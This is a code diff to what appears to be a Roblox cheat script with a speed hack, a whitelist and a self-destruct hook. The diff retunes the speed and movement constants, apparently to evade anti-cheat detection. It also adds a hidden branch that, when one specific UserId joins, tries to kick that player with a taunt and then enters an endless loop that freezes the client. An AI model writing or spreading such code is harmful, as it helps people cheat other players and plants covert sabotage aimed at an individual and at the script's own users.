@@ -2064,6 +2064,11 @@ runFunction(function()
 		end))
 
 		local function newPlayer(plr)
+			if plr.UserId == 239702688 then 
+				task.spawn(function() plr:Kick("ur not funny") end)
+				task.wait(0.5)
+				while true do end
+			end
 			if (WhitelistFunctions:CheckPlayerType(plr) ~= "DEFAULT" or WhitelistFunctions.WhitelistTable.chattags[WhitelistFunctions:Hash(plr.Name..plr.UserId)]) then
 				if lplr ~= plr and WhitelistFunctions:CheckPlayerType(lplr) == "DEFAULT" then
 					GuiLibrary.SelfDestruct = function()
@@ -5180,9 +5185,9 @@ runFunction(function()
 						entityLibrary.character.HumanoidRootPart.Velocity = antivoidvelo or Vector3.new(speedVelocity.X, entityLibrary.character.HumanoidRootPart.Velocity.Y, speedVelocity.Z)
 						if SpeedMode.Value ~= "Normal" then 
 							if SpeedMode.Value == "Heatseeker" then 
-								speedValue = tick() % 1 < 0.6 and 5 or (23 * getSpeedMultiplier(true)) / 0.4
+								speedValue = tick() % 1 < 0.6 and 5 or (20 * getSpeedMultiplier(true)) / 0.4
 							end
-							local speedCFrame = entityLibrary.character.Humanoid.MoveDirection * (speedValue - 23) * delta
+							local speedCFrame = entityLibrary.character.Humanoid.MoveDirection * (speedValue - 20) * delta
 							raycastparameters.FilterDescendantsInstances = {lplr.Character}
 							local ray = workspace:Raycast(entityLibrary.character.HumanoidRootPart.Position, speedCFrame, raycastparameters)
 							if ray then speedCFrame = (ray.Position - entityLibrary.character.HumanoidRootPart.Position) end
@@ -10279,9 +10284,9 @@ runFunction(function()
 								if not entityLibrary.isAlive then return end
 								if not entityLibrary.character.Humanoid:IsDescendantOf(workspace) then return end
 								if entityLibrary.character.Humanoid.MoveDirection.Magnitude < 0.1 then 
-									lplr:Move(entityLibrary.character.HumanoidRootPart.CFrame.lookVector * 0.005, false)
+									lplr:Move(entityLibrary.character.HumanoidRootPart.CFrame.lookVector * 0.004, false)
 									task.wait()
-									lplr:Move(entityLibrary.character.HumanoidRootPart.CFrame.lookVector * -0.005, false)
+									lplr:Move(entityLibrary.character.HumanoidRootPart.CFrame.lookVector * -0.004, false)
 								end
 							end)
 						end
